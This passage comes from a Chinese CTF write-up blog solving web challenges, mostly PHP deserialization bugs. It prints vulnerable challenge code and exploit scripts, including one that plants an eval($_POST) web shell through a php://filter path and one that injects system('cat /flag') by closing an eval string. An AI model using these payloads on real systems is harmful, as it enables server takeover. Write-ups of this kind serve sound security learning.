class="hljs-title">cls2</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;hello.php&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$txt</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-string">&#x27;fileput&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fileput</span>();<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$key</span>).<span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;                       <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileput</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || <br>            <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-string">&#x27;\\&#x27;</span>) !== <span class="hljs-literal">false</span>) <br>            <span class="hljs-keyword">die</span>();<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php die(\&#x27;stupid\&#x27;); ?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$content</span> .= <span class="hljs-variable language_">$this</span>-&gt;txt;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>))&#123;<br>    <span class="hljs-variable">$cls</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ser&#x27;</span>]);<br>    <span class="hljs-variable">$instance</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cls</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls1</span>();<br>    <span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></div></td></tr></table></figure>

<p>1.exp: <img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211547997.png" srcset="/img/loading.gif" lazyload alt="image-20241024211547997"></p>
<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls1</span></span>&#123; <br><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cls</span>; <br><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$arr</span>; <br><br>&#125; <br><br> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls2</span></span>&#123; <br><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>; <br><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$txt</span>; <br><br>&#125; <br><br> <br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls1</span>(); <br><br><span class="hljs-variable">$a</span> -&gt; cls = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls2</span>(); <br><br><span class="hljs-variable">$a</span> -&gt; arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;fileput&quot;</span> =&gt; <span class="hljs-string">&quot;fileput&quot;</span>); <br><br><span class="hljs-variable">$a</span> -&gt; cls -&gt; filename = <span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=shella.php&quot;</span>; <br><br><span class="hljs-variable">$a</span> -&gt; cls -&gt; txt = <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);&#x27;</span>; <br><br><span class="hljs-variable">$a</span> -&gt; cls -&gt; txt = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span> -&gt; cls -&gt; txt); <br><br> <br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)); <br><br>  <br></code></pre></div></td></tr></table></figure>

<h2 id="3、WEB-unserialize-0ctf"><a href="#3、WEB-unserialize-0ctf" class="headerlink" title="3、WEB_unserialize_0ctf"></a>3、WEB_unserialize_0ctf</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211838818.png" srcset="/img/loading.gif" lazyload alt="image-20241024211838818"></p>
<p>扫描，发现<a target="_blank" rel="noopener" href="http://www.zip备份/">www.zip备份</a> </p>
<p>flag在config里边 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211849645.png" srcset="/img/loading.gif" lazyload alt="image-20241024211849645"></p>
<p>register.php注册账号后，profile.php设置一些参数，危险函数在photo中，这边将上传的photobase64编码 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211901120.png" srcset="/img/loading.gif" lazyload alt="image-20241024211901120"></p>
<p>class类中，如果有含有关键词，就替换成hacker，这里一个个测试，看看，发现nickname设置成关键字就会替换成hacker，需要序列化逃逸， </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211917464.png" srcset="/img/loading.gif" lazyload alt="image-20241024211917464"></p>
<p>通过nickname的字符逃逸然后逃逸出的在photo中，也就是config.php文件 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211929563.png" srcset="/img/loading.gif" lazyload alt="image-20241024211929563"></p>
<p><a href="onenote:..\CTF\PHPCTF\PHP反序列化字符串逃逸.one#section-id={67556CA1-5694-4A97-9FA9-E92D5CB4AB0C}&end&base-path=https://d.docs.live.net/5fd9226643f52715/文档/我的网安学习之路（服了我自己了）">字符串逃逸</a>就是将需要查看需要逃逸出来的字段，查看有几位，比如传入4位字符，然后正则将其替换成5位字符，就会多一位出来，这样传入就可以将剩下的逃逸出来 </p>
<p>正常的序列，标红的是要逃逸出来的字符串，34个字符串 </p>
<p>O:1:”a”:4:{s:5:”phone”;s:11:”12345678901”;s:5:”email”;s:10:”<a href="mailto:&#49;&#x32;&#x33;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;">&#49;&#x32;&#x33;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;</a>“;s:8:”nickname”;a:1:{i:0;s:3:”123”;}s:5:”photo”;s:10:”config.php”;} </p>
<p>34个where </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211955794.png" srcset="/img/loading.gif" lazyload alt="image-20241024211955794"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212006538.png" srcset="/img/loading.gif" lazyload alt="image-20241024212006538"></p>
<h2 id="4、WEB-babyphp"><a href="#4、WEB-babyphp" class="headerlink" title="4、WEB_babyphp"></a>4、WEB_babyphp</h2><p>简单覆盖就行了</p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212056153.png" srcset="/img/loading.gif" lazyload alt="image-20241024212056153"></p>
<h2 id="5、eval-vardump"><a href="#5、eval-vardump" class="headerlink" title="5、eval_vardump"></a>5、eval_vardump</h2><p>闭合绕过</p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212139000.png" srcset="/img/loading.gif" lazyload alt="image-20241024212139000"></p>
<h2 id="6、WEB-easygame"><a href="#6、WEB-easygame" class="headerlink" title="6、WEB_easygame"></a>6、WEB_easygame</h2><p>跟着操作就行了，get传值，post传值，改X-Forwarded-For </p>
<h2 id="7、WEB-web-phpmd5"><a href="#7、WEB-web-phpmd5" class="headerlink" title="7、WEB_web_phpmd5"></a>7、WEB_web_phpmd5</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212210101.png" srcset="/img/loading.gif" lazyload alt="image-20241024212210101"></p>
<h2 id="8、WEB-xx"><a href="#8、WEB-xx" class="headerlink" title="8、WEB_xx"></a>8、WEB_xx</h2><p>具体是要xss，直接控制面板弹个窗就行了，通杀</p>
<h2 id="9、WEB-simplepop-wc"><a href="#9、WEB-simplepop-wc" class="headerlink" title="9、WEB_simplepop_wc"></a>9、WEB_simplepop_wc</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212352536.png" srcset="/img/loading.gif" lazyload alt="image-20241024212352536"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212359310.png" srcset="/img/loading.gif" lazyload alt="image-20241024212359310"></p>
<p>useless.php</p>
<p>题目代码</p>
<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<span class="hljs-comment">//flag.php</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<span class="hljs-comment">//2</span><br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<span class="hljs-comment">//1</span><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span>  <br><br></code></pre></div></td></tr></table></figure>

<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212459640.png" srcset="/img/loading.gif" lazyload alt="image-20241024212459640"></p>
<h2 id="10、WEB-smiplecode-wc"><a href="#10、WEB-smiplecode-wc" class="headerlink" title="10、WEB_smiplecode_wc"></a>10、WEB_smiplecode_wc</h2><p>git泄露或者查看源代码index.php <img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212536891.png" srcset="/img/loading.gif" lazyload alt="image-20241024212536891"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212543302.png" srcset="/img/loading.gif" lazyload alt="image-20241024212543302"></p>
<p>有个index，访问看看，有个getflag，进去，审计代码 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212550522.png" srcset="/img/loading.gif" lazyload alt="image-20241024212550522"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212604245.png" srcset="/img/loading.gif" lazyload alt="image-20241024212604245"></p>
<table>
<thead>
<tr>
<th>preg_match的概念</th>
</tr>
</thead>
<tbody><tr>
<td>返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</td>
</tr>
</tbody></table>
<p>这里有4个地方要绕过 </p>
<p>第一个if，需要2个get传参，?f4&#x3D;xxxx&amp;ag&#x3D;xxxx，进入else </p>
<p>第二个if，正则表达式，A-Za-z0-9还有(，这里需要为true，就是说要满足条件，a( b( c(都可以绕过，中括号里面的加上一个括号 </p>
<p>第三个if，满足条件就行 （w+：字符类(包括大小写字母,数字) ，利用preg_match特性，写2个语句，如:phpinfo();system(ls) </p>
<p>第四个echo，百度到，也是该对象的个数，绕过方式和wakeup一样 </p>
<p>构造payload </p>
<p>f4&#x3D;a( </p>
<p>闭合eval的话 </p>
<table>
<thead>
<tr>
<th>$a -&gt; cmd &#x3D; ‘“;phpinfo();$a&#x3D;”3’;</th>
<th>payload</th>
</tr>
</thead>
<tbody><tr>
<td>eval(‘$a&#x3D;”‘.$this-&gt;cmd.’”;’);</td>
<td>需绕过</td>
</tr>
<tr>
<td>eval(‘$a&#x3D;”‘“;phpinfo();”‘“;’);</td>
<td>拼接上后</td>
</tr>
</tbody></table>
<p>题目代码</p>
<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//flag在/flag里</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">f4ag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\w+\((?R)?\)/&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$a=&quot;&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;cmd.<span class="hljs-string">&#x27;&quot;;&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hack!!!&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f4&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ag&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(@<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;getf4ag.php&#x27;</span>,<span class="hljs-literal">true</span>));<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[A-Za-z0-9]+\(/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f4&#x27;</span>]))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hack!!!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ag&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">f4ag</span></span>&#123;<br>	    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br>	    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>	        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\w+\((?R)?\)/&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>	            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$a=&quot;&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;cmd.<span class="hljs-string">&#x27;&quot;;&#x27;</span>);<br>	        &#125;<br>	        <span class="hljs-keyword">else</span> &#123;<br>	            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hack!!!&#x27;</span>);<br>	        &#125;<br>	    &#125;<br>	&#125;<br>	<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">f4ag</span>();<br>	<span class="hljs-variable">$a</span> -&gt; cmd = <span class="hljs-string">&#x27;&quot;;phpinfo();system(&quot;cat /flag&quot;);&quot;&#x27;</span>;<br>	<span class="hljs-comment">#$a -&gt; cmd = &#x27;&quot;;phpinfo();$b=&quot;&#x27;;</span><br>	<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>

<h2 id="11、WEB-serialize-wc"><a href="#11、WEB-serialize-wc" class="headerlink" title="11、WEB_serialize_wc"></a><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212839607.png" srcset="/img/loading.gif" lazyload alt="image-20241024212839607">11、WEB_serialize_wc</h2><p>git泄露。 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212906846.png" srcset="/img/loading.gif" lazyload alt="image-20241024212906846"></p>
<p>user设置指定值，dir有过滤，在repass传入payload </p>
<p>题目代码</p>
<p>index.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>	&lt;title&gt;file-reading&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>	&lt;form action=&quot;index.php&quot; method=&quot;GET&quot;&gt;<br>		username&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;<br>		password&lt;input type=&quot;text&quot; name=&quot;pass&quot;&gt;<br>		repassword&lt;input type=&quot;text&quot; name=&quot;repass&quot;&gt;<br>		filename&lt;input type=&quot;text&quot; name=&quot;dir&quot;&gt;<br>		&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;<br>	&lt;/form&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br>only admin can view /flag<br>&lt;?php<br>include &#x27;config.php&#x27;;<br><br><br>$data = unserialize($get);<br>if ($_SERVER[&#x27;REMOTE_ADDR&#x27;] == &#x27;127.0.0.1&#x27;) &#123;<br>	$myFile = new File($data[&#x27;user&#x27;], $data[&#x27;pass&#x27;], $data[&#x27;repass&#x27;], $data[&#x27;dir&#x27;]);<br>&#125; else &#123;<br>	if (preg_match(&#x27;/flag|\.\.|\/|index|config/i&#x27;, $dir)) &#123;<br>	    die(&#x27;NO Hacker !!!!!!!!&#x27;);<br>	&#125;<br>	$myFile = new File($data[&#x27;user&#x27;], $data[&#x27;pass&#x27;], $data[&#x27;repass&#x27;], $data[&#x27;dir&#x27;]);<br>&#125;<br><br><br>?&gt;<br></code></pre></div></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 